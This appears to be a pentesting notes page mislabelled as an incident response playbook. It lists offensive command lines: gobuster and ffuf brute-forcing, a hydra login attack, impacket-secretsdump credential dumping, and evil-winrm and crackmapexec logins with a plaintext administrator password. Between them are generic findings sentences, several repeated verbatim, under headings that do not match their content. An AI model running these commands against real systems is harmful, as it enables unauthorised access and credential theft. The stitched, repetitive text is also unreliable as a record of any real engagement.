---
TitleSEO: "Incident Response Playbook | ZureFX"
TitlePost: "Incident Response Playbook"
Author: "ZureFX"
Description: "Personal notes on Incident Response Playbook. Quick reference for pentesting and CTF challenges."
Keywords: "dfir, persistence, networking, blue team, enumeration, oscp"
URL: "https://zurefx.github.io/notes/note-incident-response-playbook-272.html"
URL_IMAGES: ""
Date: "2025-05-21"
Tags: "DFIR, Persistence, Networking, Blue Team, Enumeration, OSCP"
Section: "notes"
Lang: "en"
main_img: "note-incident-response-playbook-272"
Permalink: "/notes/note-incident-response-playbook-272.html"
BtnLabel: "Read Notes"
Pick: 0
---
## SeImpersonatePrivilege

### GetNPUsers

```bash
gobuster dir -u http://10.23.233.158/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
impacket-secretsdump administrator:'P@ssw0rd!'@10.93.82.115
evil-winrm -i 10.10.151.11 -u administrator -p 'P@ssw0rd!'
```

The service account had excessive permissions assigned in Active Directory. Initial enumeration revealed several interesting open ports on the target. The database credentials were hardcoded in the application source code. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.54.186.82/FUZZ
```

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.76.186.227 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.66.110.57
```

## Node.js

### enum4linux

- `sharphound`
- `sqlmap`
- `SUID Binary`

Group Policy Preferences contained encrypted but recoverable credentials. Privilege escalation was possible due to misconfigured sudo permissions. The application stored sensitive credentials in an unencrypted configuration file. The scheduled task ran with elevated privileges and could be abused for escalation. The kernel version was outdated and vulnerable to a publicly known exploit.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.113.226.151
```

- `john`
- `SeImpersonatePrivilege`
- `GetUserSPNs`
- `GetNPUsers`
- `ldapsearch`

## Python

### RPC

The database credentials were hardcoded in the application source code. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
gobuster dir -u http://10.62.61.49/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.107.57.238 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.50.55.104/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.40.205.66/FUZZ
```

The service was running without proper input validation, leading to injection vulnerabilities. Privilege escalation was possible due to misconfigured sudo permissions. The service was running without proper input validation, leading to injection vulnerabilities. The backup files contained sensitive information that should not have been accessible.

> **Note:** AS-REP Roasting was identified as the primary attack vector in this scenario.

The backup files contained sensitive information that should not have been accessible. Network traffic analysis revealed unencrypted communications containing user credentials. Group Policy Preferences contained encrypted but recoverable credentials. Group Policy Preferences contained encrypted but recoverable credentials.
